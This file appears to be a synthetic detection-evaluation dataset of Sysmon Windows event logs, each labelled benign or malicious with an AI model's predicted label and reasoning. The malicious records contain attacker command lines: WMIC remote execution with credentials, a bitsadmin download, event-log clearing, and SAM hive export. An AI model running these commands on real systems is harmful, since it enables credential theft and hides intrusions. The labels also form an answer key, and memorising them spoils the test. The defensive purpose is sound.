{"EventID": 15, "EventTime": "2025-10-10 08:04:40", "UtcTime": "2025-10-10T08:04:40.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "7890", "ProcessGUID": "{af2357be-3d4f-82ee-1400-000000000800}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "Image": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "TargetFilename": "C:\\Users\\jsmith\\AppData\\Local\\Microsoft\\Office\\16.0\\Word\\~$WordDocument.docx", "CreationUtcTime": "2025-10-10T08:04:40.000Z", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:04:40] | PID=7890 | User=CORP\\jsmith | Image=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Word (WINWORD.EXE) launched by corporate user jsmith from legitimate Office installation directory - standard office productivity application usage.", "confidence": "high", "attack_technique": ""}}
{"EventID": 3, "EventTime": "2025-10-10 08:03:10", "UtcTime": "2025-10-10T08:03:10.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "ProcessId": "1901", "ProcessGUID": "{6c0d2266-e4fa-3d99-1f00-000000001300}", "User": "CORP\\jsmith", "IntegrityLevel": "Medium", "SourcePort": "54323", "DestinationIp": "104.18.208.5", "DestinationPort": "443", "DestinationHostname": "www.mozilla.org", "Protocol": "TCP", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:10] | PID=1901 | User=CORP\\jsmith | Image=C:\\Program Files\\Mozilla Firefox\\firefox.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Mozilla Firefox browser process running under a normal corporate user account - standard legitimate application usage with no suspicious indicators.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:15", "UtcTime": "2020-05-01T22:57:15.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c wmic /node:192.168.1.100 /user:admin /password:Password123 process call create \"powershell.exe -Command \\\"Write-Host 'Pwned!'\\\"\"", "ProcessId": "1480", "ProcessGUID": "{6bbf237a-05c8-5eac-05c8-0000000005c8}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1024", "ParentProcessGUID": "{6bbf237a-0400-5eac-0400-000000000400}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:15] | PID=1480 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c wmic /node:192.168.1.100 /user:admin /password:Password123 process call create \"powershell.exe -Command \\\"Write-Host 'Pwned!'\\\"\"", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "WMIC used for remote command execution with hardcoded credentials to spawn PowerShell on remote host 192.168.1.100 - classic lateral movement technique. The SYSTEM account executing from explorer.exe is also highly suspicious.", "confidence": "high", "attack_technique": "remote_execution"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:50", "UtcTime": "2020-05-01T22:56:50.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c bitsadmin /transfer job1 /download /priority normal http://example.com/upload/encoded.txt C:\\Users\\Public\\Documents\\encoded.zip", "ProcessId": "1789", "ProcessGUID": "{6bbf237a-06fd-5eac-06fd-0000000006fd}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "432", "ParentProcessGUID": "{6bbf237a-01b0-5eac-01b0-0000000001b0}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:50] | PID=1789 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c bitsadmin /transfer job1 /download /priority normal http://example.com/upload/encoded.txt C:\\Users\\Public\\Documents\\encoded.zip", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Bitsadmin used to download file from external URL to public directory - a common LOTL technique for malware delivery. Additionally, the NETWORK SERVICE account spawning cmd.exe from explorer.exe is highly suspicious.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:30", "UtcTime": "2020-05-01T22:57:30.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c wevtutil cl System", "ProcessId": "1350", "ProcessGUID": "{6bbf237a-0546-5eac-0546-000000000546}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "420", "ParentProcessGUID": "{6bbf237a-01a4-5eac-01a4-0000000001a4}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "log_clearing", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:30] | PID=1350 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c wevtutil cl System", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Command uses wevtutil to clear the System event log, a classic defense evasion technique to hide malicious activity. Additionally, the parent process being explorer.exe with NETWORK SERVICE account is highly suspicious.", "confidence": "high", "attack_technique": "defense_evasion"}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:15", "UtcTime": "2020-05-01T22:56:15.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c net view /domain", "ProcessId": "13456", "ProcessGUID": "{6bbf237a-3490-5eac-3490-000000003490}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "4328", "ParentProcessGUID": "{6bbf237a-10e8-5eac-10e8-0000000010e8}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "network_enumeration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:15] | PID=13456 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c net view /domain", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Network enumeration command 'net view /domain' executed by NETWORK SERVICE account from explorer.exe parent - unusual privilege context for domain reconnaissance activity.", "confidence": "high", "attack_technique": "network_enumeration"}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:05", "UtcTime": "2020-05-01T22:57:05.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c bitsadmin /transfer job1 /complete", "ProcessId": "6153", "ProcessGUID": "{6bbf237a-1809-5eac-1809-000000001809}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "5289", "ParentProcessGUID": "{6bbf237a-14a9-5eac-14a9-0000000014a9}", "ParentCommandLine": "cmd.exe /c bitsadmin /transfer job1 /resume", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\SYSTEM\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_exfiltration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:05] | PID=6153 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=cmd.exe /c bitsadmin /transfer job1 /complete", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "SYSTEM account using bitsadmin for file transfer operations, which is commonly abused by attackers for downloading malicious payloads or exfiltrating data. The cmd.exe parent-child relationship with bitsadmin transfer suggests automated execution.", "confidence": "high", "attack_technique": "command_and_control"}}
{"EventID": 3, "EventTime": "2025-10-10 08:04:10", "UtcTime": "2025-10-10T08:04:10.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Mozilla Firefox\\firefox.exe", "ProcessId": "2013", "ProcessGUID": "{12345678-1234-5678-1234-567812340017}", "User": "WORKSTATION\\user", "IntegrityLevel": "Medium", "SourcePort": "50003", "DestinationIp": "104.18.203.123", "DestinationPort": "443", "DestinationHostname": "www.mozilla.org", "Protocol": "tcp", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:04:10] | PID=2013 | User=WORKSTATION\\user | Image=C:\\Program Files\\Mozilla Firefox\\firefox.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Firefox browser process running from legitimate installation directory under standard user context - normal application usage.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:00:30", "UtcTime": "2025-10-10T08:00:30.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE", "CommandLine": "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" C:\\Users\\jsmith\\Documents\\document.docx", "ProcessId": "7890", "ProcessGUID": "{af2357be-3d4f-82ee-1400-000000000800}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5fbd-1100-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\Documents\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:30] | PID=7890 | User=CORP\\jsmith | Image=C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" C:\\Users\\jsmith\\Documents\\document.docx", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Word launched by Windows Explorer to open a document in the user's Documents folder - standard office application usage with normal parent-child process relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:04:40", "UtcTime": "2025-10-10T08:04:40.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Microsoft VS Code\\Code.exe", "CommandLine": "\"C:\\Program Files\\Microsoft VS Code\\Code.exe\" .", "ProcessId": "2015", "ProcessGUID": "{12345678-1234-5678-1234-567812340019}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1000", "ParentProcessGUID": "{12345678-1234-5678-1234-567812340001}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "WORKSTATION\\user", "Domain": "WORKSTATION", "AccountName": "user", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\user\\Documents\\dev", "LogonId": "0x1234", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:04:40] | PID=2015 | User=WORKSTATION\\user | Image=C:\\Program Files\\Microsoft VS Code\\Code.exe | Parent=C:\\Windows\\explorer.exe | CMD=\"C:\\Program Files\\Microsoft VS Code\\Code.exe\" .", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Visual Studio Code launched by Windows Explorer with normal command line arguments - standard user application activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:55", "UtcTime": "2020-05-01T22:57:55.000Z", "Hostname": "SCRANTON.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\services.exe", "CommandLine": "C:\\Windows\\System32\\services.exe", "ProcessId": "7328", "ProcessGUID": "{6bbf237a-1ca0-5eac-1ca0-000000001ca0}", "ParentImage": "C:\\Windows\\System32\\svchost.exe", "ParentProcessId": "912", "ParentProcessGUID": "{6bbf237a-0390-5eac-0390-000000000390}", "ParentCommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "lateral_movement", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:55] | PID=7328 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\services.exe | Parent=C:\\Windows\\System32\\svchost.exe | CMD=C:\\Windows\\System32\\services.exe", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Services.exe spawned by svchost.exe is highly suspicious - services.exe should only be spawned by wininit.exe at boot. This indicates process injection or masquerading.", "confidence": "high", "attack_technique": "process_injection"}}
{"EventID": 1, "EventTime": "2025-10-10 08:03:40", "UtcTime": "2025-10-10T08:03:40.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\msiexec.exe", "CommandLine": "msiexec.exe /i C:\\Users\\user\\example.msi", "ProcessId": "2012", "ProcessGUID": "{12345678-1234-5678-1234-567812340016}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1000", "ParentProcessGUID": "{12345678-1234-5678-1234-567812340001}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "WORKSTATION\\user", "Domain": "WORKSTATION", "AccountName": "user", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\user", "LogonId": "0x1234", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:40] | PID=2012 | User=WORKSTATION\\user | Image=C:\\Windows\\System32\\msiexec.exe | Parent=C:\\Windows\\explorer.exe | CMD=msiexec.exe /i C:\\Users\\user\\example.msi", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User executing Windows Installer (msiexec.exe) to install an MSI package from their user directory, launched from explorer.exe - standard software installation activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:35", "UtcTime": "2020-05-01T22:56:35.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\nltest.exe", "CommandLine": "nltest /domain_trusts", "ProcessId": "13457", "ProcessGUID": "{6bbf237a-3491-5eac-3491-000000003491}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "13456", "ParentProcessGUID": "{6bbf237a-3490-5eac-3490-000000003490}", "ParentCommandLine": "cmd.exe /c net view /domain", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "network_enumeration", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:35] | PID=13457 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\nltest.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=nltest /domain_trusts", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "nltest.exe with /domain_trusts parameter is used for Active Directory reconnaissance to enumerate domain trust relationships, commonly used by attackers for network mapping and lateral movement planning.", "confidence": "high", "attack_technique": "network_enumeration"}}
{"EventID": 1, "EventTime": "2025-10-15 08:22:12", "UtcTime": "2025-10-15T08:22:12.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\svchost.exe", "CommandLine": "C:\\Windows\\System32\\svchost.exe -k netsvcs -p", "ProcessId": "1234", "ProcessGUID": "{123e4567-e89b-12d3-a456-426614174000}", "ParentImage": "C:\\Windows\\System32\\services.exe", "ParentProcessId": "567", "ParentProcessGUID": "{fedcba98-7654-3210-fedc-ba9876543210}", "ParentCommandLine": "C:\\Windows\\System32\\services.exe", "User": "NT AUTHORITY\\SYSTEM", "Domain": "NT AUTHORITY", "AccountName": "SYSTEM", "IntegrityLevel": "System", "CurrentDirectory": "C:\\Windows\\system32", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-15 08:22:12] | PID=1234 | User=NT AUTHORITY\\SYSTEM | Image=C:\\Windows\\System32\\svchost.exe | Parent=C:\\Windows\\System32\\services.exe | CMD=C:\\Windows\\System32\\svchost.exe -k netsvcs -p", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Legitimate svchost.exe process running as SYSTEM with standard netsvcs parameters, spawned by services.exe which is the expected parent process for Windows service hosting.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-10-10 08:00:20", "UtcTime": "2025-10-10T08:00:20.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE", "CommandLine": "C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE C:\\Users\\jsmith\\Documents\\Document1.docx", "ProcessId": "7890", "ProcessGUID": "{9def460c-ecf1-5eb0-1000-000000000700}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "2048", "ParentProcessGUID": "{7acb248b-dbdc-5ead-1000-000000000500}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\Documents\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:00:20] | PID=7890 | User=CORP\\jsmith | Image=C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE | Parent=C:\\Windows\\explorer.exe | CMD=C:\\Program Files\\Microsoft Office\\Office16\\WINWORD.EXE C:\\Users\\jsmith\\Documents\\Document1.docx", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Microsoft Word launched by Windows Explorer to open a document in the user's Documents folder - standard office application usage with normal parent-child process relationship.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:56:11", "UtcTime": "2020-05-01T22:56:11.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\takeown.exe", "CommandLine": "takeown /f C:\\Windows\\System32\\drivers\\etc\\hosts", "ProcessId": "1245", "ProcessGUID": "{6bbf237a-04dd-5eac-04dd-0000000004dd}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentCommandLine": "cmd.exe /c takeown /f C:\\Windows\\System32\\drivers\\etc\\hosts", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\NETWORK SERVICE\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "permission_manipulation", "_source": "llm_scenario", "prompt": "[2020-05-01 22:56:11] | PID=1245 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\takeown.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=takeown /f C:\\Windows\\System32\\drivers\\etc\\hosts", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Taking ownership of the hosts file using takeown.exe is a permission manipulation technique often used to modify DNS resolution for malicious purposes like redirecting traffic or blocking security updates.", "confidence": "high", "attack_technique": "permission_manipulation"}}
{"EventID": 1, "EventTime": "2020-05-01 22:55:56", "UtcTime": "2020-05-01T22:55:56.000Z", "Hostname": "UTICA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmdkey /list", "ProcessId": "1234", "ProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "1111", "ParentProcessGUID": "{6bbf237a-0457-5eac-0457-000000000457}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "credential_discovery", "_source": "llm_scenario", "prompt": "[2020-05-01 22:55:56] | PID=1234 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmdkey /list", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "The cmdkey /list command is used to enumerate stored Windows credentials, which is a common credential discovery technique used by attackers to find saved passwords and authentication tokens.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2020-05-01 22:55:43", "UtcTime": "2020-05-01T22:55:43.000Z", "Hostname": "NASHUA.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\cmd.exe", "CommandLine": "cmd.exe /c makecab C:\\Users\\pbeesly\\Documents\\ProjectPlans.docx C:\\ProgramData\\temp.cab", "ProcessId": "1234", "ProcessGUID": "{6bbf237a-04d2-5eac-04d2-0000000004d2}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "456", "ParentProcessGUID": "{6bbf237a-01c8-5eac-01c8-0000000001c8}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "DMEVALS\\pbeesly", "Domain": "DMEVALS", "AccountName": "pbeesly", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "data_staging", "_source": "llm_scenario", "prompt": "[2020-05-01 22:55:43] | PID=1234 | User=DMEVALS\\pbeesly | Image=C:\\Windows\\System32\\cmd.exe | Parent=C:\\Windows\\explorer.exe | CMD=cmd.exe /c makecab C:\\Users\\pbeesly\\Documents\\ProjectPlans.docx C:\\ProgramData\\temp.cab", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Using makecab to compress a document file to ProgramData directory indicates data staging for potential exfiltration. ProgramData is an unusual location for user document operations and suggests preparation for data theft.", "confidence": "high", "attack_technique": "data_staging"}}
{"EventID": 13, "EventTime": "2025-10-10 08:02:10", "UtcTime": "2025-10-10T08:02:10.000Z", "Hostname": "WORKSTATION-01", "Channel": "Microsoft-Windows-Sysmon/Operational", "ProcessId": "2007", "ProcessGUID": "{12345678-1234-5678-1234-567812340010}", "User": "WORKSTATION\\user", "IntegrityLevel": "Medium", "Image": "C:\\Program Files\\7-Zip\\7zFM.exe", "TargetObject": "HKEY_CURRENT_USER\\Software\\7-Zip\\FM\\Path", "EventType": "SetValue", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:02:10] | PID=2007 | User=WORKSTATION\\user | Image=C:\\Program Files\\7-Zip\\7zFM.exe", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "7-Zip File Manager (7zFM.exe) launched by a regular user from its standard installation directory - normal file compression/extraction activity.", "confidence": "high", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2025-11-07 02:34:20", "UtcTime": "2025-11-07T02:34:20.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Program Files\\PowerShell\\7\\pwsh.exe", "CommandLine": "pwsh.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\jsmith\\Documents\\script.ps1", "ProcessId": "11234", "ProcessGUID": "{b238fa12-8245-b27d-4e50-ec66bebe4aaa}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "1234", "ParentProcessGUID": "{123e4567-e89b-12d3-a456-426614174000}", "ParentCommandLine": "cmd.exe /c powershell -file C:\\Users\\jsmith\\Documents\\script.ps1", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Users\\jsmith\\Documents", "LogonId": "0x12345", "_label": "benign", "_source": "llm", "prompt": "[2025-11-07 02:34:20] | PID=11234 | User=CORP\\jsmith | Image=C:\\Program Files\\PowerShell\\7\\pwsh.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=pwsh.exe -NoProfile -ExecutionPolicy Bypass -File C:\\Users\\jsmith\\Documents\\script.ps1", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "User executing a PowerShell script from their Documents folder with common development flags. The parent process (cmd.exe) and execution context suggest normal scripting activity by a domain user.", "confidence": "medium", "attack_technique": ""}}
{"EventID": 1, "EventTime": "2020-05-01 22:57:04", "UtcTime": "2020-05-01T22:57:04.000Z", "Hostname": "NEWYORK.dmevals.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\reg.exe", "CommandLine": "reg save HKLM\\SAM C:\\ProgramData\\sam.hiv", "ProcessId": "1027", "ProcessGUID": "{6bbf237a-0403-5eac-0403-000000000403}", "ParentImage": "C:\\Windows\\explorer.exe", "ParentProcessId": "420", "ParentProcessGUID": "{6bbf237a-01a4-5eac-01a4-0000000001a4}", "ParentCommandLine": "C:\\Windows\\explorer.exe", "User": "NT AUTHORITY\\NETWORK SERVICE", "Domain": "NT AUTHORITY", "AccountName": "NETWORK SERVICE", "IntegrityLevel": "Medium", "CurrentDirectory": "C:\\Windows\\System32\\", "LogonId": "0x3e7", "_label": "malicious", "_attack_technique": "memory_credential_dumping", "_source": "llm_scenario", "prompt": "[2020-05-01 22:57:04] | PID=1027 | User=NT AUTHORITY\\NETWORK SERVICE | Image=C:\\Windows\\System32\\reg.exe | Parent=C:\\Windows\\explorer.exe | CMD=reg save HKLM\\SAM C:\\ProgramData\\sam.hiv", "claude-sonnet-4-5": {"predicted_label": "malicious", "reason": "Exporting the SAM registry hive to ProgramData directory is a credential dumping technique used to extract password hashes. The SAM hive contains local account credentials and should never be exported during normal operations.", "confidence": "high", "attack_technique": "credential_discovery"}}
{"EventID": 1, "EventTime": "2025-10-10 08:03:30", "UtcTime": "2025-10-10T08:03:30.000Z", "Hostname": "WORKSTATION-01.corp.local", "Channel": "Microsoft-Windows-Sysmon/Operational", "SourceImage": "C:\\Windows\\System32\\conhost.exe", "CommandLine": "\\??\\C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1", "ProcessId": "2123", "ProcessGUID": "{8e2f4488-001c-5f1b-2100-000000001500}", "ParentImage": "C:\\Windows\\System32\\cmd.exe", "ParentProcessId": "4512", "ParentProcessGUID": "{6bbf237a-cafb-5eac-1000-000000000400}", "ParentCommandLine": "cmd.exe /c dir C:\\Users", "User": "CORP\\jsmith", "Domain": "CORP", "AccountName": "jsmith", "IntegrityLevel": "System", "CurrentDirectory": "C:\\Windows\\system32\\", "LogonId": "0x3e7", "_label": "benign", "_source": "llm", "prompt": "[2025-10-10 08:03:30] | PID=2123 | User=CORP\\jsmith | Image=C:\\Windows\\System32\\conhost.exe | Parent=C:\\Windows\\System32\\cmd.exe | CMD=\\??\\C:\\Windows\\System32\\conhost.exe 0xffffffff -ForceV1", "claude-sonnet-4-5": {"predicted_label": "benign", "reason": "Conhost.exe is the legitimate Windows Console Host process spawned by cmd.exe to handle console window rendering. This is normal Windows behavior when command prompt sessions are created.", "confidence": "high", "attack_technique": ""}}
